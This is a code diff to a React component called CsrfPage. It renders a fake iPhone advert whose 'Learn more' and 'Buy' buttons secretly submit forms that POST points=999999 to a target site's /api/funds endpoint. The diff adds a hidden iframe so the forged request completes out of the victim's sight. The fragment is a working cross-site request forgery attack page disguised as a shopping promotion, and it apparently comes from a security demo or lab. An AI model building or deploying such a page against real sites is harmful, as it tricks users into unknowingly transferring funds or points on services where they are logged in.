@@ -13,16 +13,17 @@ class CsrfPage extends React.Component {
         return (
             <div>
                 <div className={s.iphone_big}>
-                    <div className={s.iphone_big_btn1} onClick={this.onClick}>
+                    <iframe className={s.hidden} name="iframeHidden"/>
+                    <div className={s.iphone_big_btn1}>
                         <form method="POST" action={`http://${target}/api/funds`} target="iframeHidden">
                             <input type="hidden" name="points" value="999999"/>
-                            <input type="submit" className="span4 btn btn-primary" value={"進一步了解"}/>
+                            <input type="submit" className="span4 btn btn-primary" value={"進一步了解"} onClick={this.onClick}/>
                          </form>
                     </div>
-                    <div className={s.iphone_big_btn2} onClick={this.onClick}>
+                    <div className={s.iphone_big_btn2}>
                         <form method="POST" action={`http://${target}/api/funds`} target="iframeHidden">
                             <input type="hidden" name="points" value="999999"/>
-                            <input type="submit" className="span4 btn btn-primary" value={"購買"}/>
+                            <input type="submit" className="span4 btn btn-primary" value={"購買"} onClick={this.onClick}/>
                         </form>
                     </div>
                 </div>
